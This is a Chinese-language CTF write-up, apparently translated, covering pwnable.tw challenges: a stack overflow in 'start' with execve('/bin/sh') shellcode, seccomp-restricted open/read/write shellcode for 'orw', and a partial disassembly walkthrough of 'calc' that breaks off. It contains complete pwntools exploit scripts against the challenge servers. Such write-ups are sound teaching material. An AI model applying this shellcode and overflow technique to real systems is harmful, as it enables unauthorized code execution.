# CTF-PWN | pwnable.tw前六题题解
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
pwnable.tw前六题题解，不算太难，不过也学到很多东西，因为官网不允许公开高分题题解，所以先写了这几道分比较低的题目。
## pwnable.tw_challenge_start
载入IDA分析：
###  0x01 _start
    public _start
    _start proc near
    push    esp
    push    offset _exit
    xor     eax, eax
    xor     ebx, ebx
    xor     ecx, ecx
    xor     edx, edx
    push    3A465443h
    push    20656874h
    push    20747261h
    push    74732073h
    push    2774654Ch
    mov     ecx, esp        ; addr
    mov     dl, 14h         ; len
    mov     bl, 1           ; fd
    mov     al, 4
    int     80h             ; LINUX - sys_write
    xor     ebx, ebx
    mov     dl, 3Ch
    mov     al, 3
    int     80h             ; LINUX -    add     esp, 14h
    retn
可以看到关键几点：
    开始时esp入栈：push    esp
    而后代表字符串:"Let's start the CTF:"的数据入栈：
    push    3A465443h
    push    20656874h
    push    20747261h
    push    74732073h
    push    2774654Ch
    调用80h中断中的4号程序：sys_write显示字符串
    调用80h中断中的3号程序：sys_read读入字符串
    栈帧大小为(我们需要覆盖的长度)20字节: add     esp, 14h
这里附上system_call的系统调用表网址：
    http://syscalls.kernelgrok.com/
###  0x02 获取shell
很显然，这里需要利用第二步调用中断的sys_read来覆盖返回地址来获取shell，因此我们需要：
    1   获得esp地址以便覆盖返回地址来执行我们的shellcode
    2   使用shellcode覆盖栈中数据
开始时，_start中将esp入栈，而最后_start返回时栈顶便是我们需要的esp值  
我们需要构造payload：
    payload=任意20字节字符串+p32(调用sys_write的mov     ecx, esp地址)
获取esp值后，我们将shellcode入栈并利用覆盖返回地址来执行：
    payload=任意20字节字符串+p32(esp+20)+shellcode
###  0x03 shellcode
利用80h中断中的sys_execve：
    x31xc9xf7xe1x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xb0x0bxcdx80
即：
    31 c9                   xor    ecx,ecx
    f7 e1                   mul    ecx
    51                      push   ecx
    68 2f 2f 73 68          push   0x68732f2f     ;传入参数/bin/sh
    68 2f 62 69 6e          push   0x6e69622f
    89 e3                   mov    ebx,esp
    b0 0b                   mov    al,0xb        ;调用80h中断中b号程序：sys_execve
    cd 80                   int    0x80
###  0x04 EXP
    from pwn import  *
    p = remote('chall.pwnable.tw',10000)
    payload = 'a'*20 + p32(0x08048087)
    p.recvuntil(':')
    p.send(payload)
    addr = u32(p.recv(4))+20
    shellcode = 'x31xc9xf7xe1x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xb0x0bxcdx80'
    payload = 'a'*20 + p32(addr) + shellcode
    p.send(payload)
    p.interactive()
## pwnable.tw_challenge_orw
载入IDA分析：
###  0x01 main
    lea     ecx, [esp+4]
    and     esp, 0FFFFFFF0h
    push    dword ptr [ecx-4]
    push    ebp
    mov     ebp, esp
    push    ecx
    sub     esp, 4
    call    orw_seccomp
    sub     esp, 0Ch
    push    offset format   ; "Give my your shellcode:"
    call    _printf
    add     esp, 10h
    sub     esp, 4
    push    0C8h            ; nbytes
    push    offset shellcode ; buf
    push    0               ; fd
    call    _read
    add     esp, 10h
    mov     eax, offset shellcode
    call    eax ; shellcode
    mov     eax, 0
    mov     ecx, [ebp+var_4]
    leave
    lea     esp, [ecx-4]
    retn
这里很简单：
    1   读入我们输入的shellcode
    2   自动调用我们的shellcode：
    mov     eax, offset shellcode
    call    eax ; shellcode
###  0x02 seccomp
首先直接尝试了调用sys_execve来获取shell，结果失败  
重新看程序，发现了 **orw_seccomp** ，猜测这里使用seccomp白名单的保护机制来限制我们对系统调用（system call）的函数调用  
这里我们的目的是读取flag文件  
为了绕过seccomp，我们不用获取shell  
只需要利用：
    sys_open
    sys_read    
    sys_write
来读取/home/orw/flag文件即可(官网：The flag is usually at /home/xxx/flag)
###  0x03 shellcode
    xor  ecx,ecx
    push ecx                 ;字符串结尾00
    push 0x67616c66
    push 0x2f77726f
    push 0x2f656d6f
    push 0x682f2f2f
    mov  ebx,esp             ;const char __user *filename
    xor  edx,edx             ;int mode
    mov  eax,0x5             ;sys_open 
    int  0x80
    mov ebx,eax              ;int  fd
    mov ecx,esp              ;char __user *buf       
    mov edx,0x30             ;size_t count
    mov eax,0x3              ;sys_read
    int 0x80
    mov eax,0x4              ;sys_write
    mov ebx,0x1              ;int fd=1   (标准输出stdout）/（0 标准输入， 1 标准输出，2 标准错误）
    mov edx,0x30             ;size_t count
    int 0x80
或者直接利用shellcraft构造：
    shellcode = ""
    shellcode += shellcraft.i386.pushstr("/home/orw/flag")
    shellcode += shellcraft.i386.linux.syscall("SYS_open", 'esp')
    shellcode += shellcraft.i386.linux.syscall("SYS_read", 'eax', 'esp', 0x30)
    shellcode += shellcraft.i386.linux.syscall("SYS_write", 1, 'esp', 0x30)
###  0x04 EXP
    from pwn import  *
    p = remote('chall.pwnable.tw',10001)
    p.recvuntil(':')
    shellcode = "xor  ecx,ecx;push ecx;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov  ebx,esp;xor  edx,edx;mov  eax,0x5;int  0x80;mov ebx,eax;mov ecx,esp;mov edx,0x30;mov eax,0x3;int 0x80;mov eax,0x4;mov ebx,0x1;mov edx,0x30;int 0x80"
    p.send(asm(shellcode))
    p.interactive()
或者：
    from pwn import *
    p = remote("chall.pwnable.tw", 10001)
    shellcode = ""
    shellcode += shellcraft.i386.pushstr("/home/orw/flag")    
    shellcode += shellcraft.i386.linux.syscall("SYS_open", 'esp')    #shellcraft.i386.linux.syscall("SYS_open", 'esp', 'O_RDONLY', 0)(O_RDONLY只读模式，O_WRONLY只写模式，O_RDWR读写模式)
    shellcode += shellcraft.i386.linux.syscall("SYS_read", 'eax', 'esp', 0x30)
    shellcode += shellcraft.i386.linux.syscall("SYS_write", 1, 'esp', 0x30)
    p.recvuntil(":")
    p.send(asm(shellcode))
    p.interactive()
## pwnable.tw_challenge_calc
首先运行一下  
了解到这个程序大概类似计算器，计算我们输入的一个合法表达式的值  
载入IDA分析：
###  0x01 程序过程
0x01 main
    push    ebp
    mov     ebp, esp
    and     esp, 0FFFFFFF0h
    sub     esp, 10h
    mov     dword ptr [esp+4], offset timeout
    mov     dword ptr [esp], 0Eh
    call    ssignal
    mov     dword ptr [esp], 3Ch
    call    alarm
    mov     dword ptr [esp], offset aWelcomeToSecpr ; "=== Welcome to SECPROG calculator ==="
    call    puts
    mov     eax, stdout
    mov     [esp], eax
    call    fflush
    call    calc
    mov     dword ptr [esp], offset aMerryChristmas ; "Merry Christmas!"
    call    puts
    leave
    retn
可以看到这里关键处：
    调用一个计时器
    调用关键函数calc
0x02 calc
0x01 canary保护
可以看到函数开始：
    push    ebp
    mov     ebp, esp
    sub     esp, 5B8h
    mov     eax, large gs:14h
    mov     [ebp+var_C], eax
    xor     eax, eax
可以看到这里启用了canary保护  
将内存large gs:14h中的(随机值)入栈  
并在程序返回前对canary值进行检验：
    nop
    mov     eax, [ebp+var_C]
    xor     eax, large gs:14h
    jz      short locret_8049432
canary值在栈中位于返回地址和函数调用参数之间  
从而保护了栈内数据，防止我们修改返回地址造成栈溢出
0x02 _bzero
canary入栈后calc调用了bzero：
    mov     dword ptr [esp+4], 400h
    lea     eax, [ebp+s]
    mov     [esp], eax      ; s
    call    _bzero
这里从ebp+s开始将一段长为0x400的空间清零
0x03 get_expr
开辟一段数据后，calc调用了get_expr函数
    mov     dword ptr [esp+4], 400h
    lea     eax, [ebp+s]
    mov     [esp], eax
    call    get_expr
跟进get_expr后发现一堆判断跳转  
大致过程：
    过滤掉除"[0-9],+,-,×,/,%"外的其他字符
    读入我们输入的表达式到_bzero开辟的空间中
    当我们成功读入返回值不为0，calc跳转到loc_80493CC处：
    test    eax, eax
    jnz     short loc_80493CC
0x04 init_pool
接下来calc调用init_pool：
    lea     eax, [ebp+var_5A0]
    mov     [esp], eax
    call    init_pool
init_pool：
    .text:08048FF8                 push    ebp
    .text:08048FF9                 mov     ebp, esp
    .text:08048FFB                 sub     esp, 10h
    .text:08048FFE                 mov     eax, [ebp+arg_0]
    .text:08049001                 mov     dword ptr [eax], 0
    .text:08049007                 mov     [ebp+var_4], 0
    .text:0804900E                 jmp     short loc_8049022
    .text:08049010 ; ---------------------------------------------------------------------------    .text:08049010
    .text:08049010 loc_8049010:                            ; CODE XREF: init_pool+2E↓j
    .text:08049010                 mov     eax, [ebp+arg_0]
    .text:08049013                 mov     edx, [ebp+var_4]
    .text:08049016                 mov     dword ptr [eax+edx*4+4], 0
    .text:0804901E                 add     [ebp+var_4], 1
    .text:08049022
    .text:08049022 loc_8049022:                            ; CODE XREF: init_pool+16↑j
    .text:08049022                 cmp     [ebp+var_4], 63h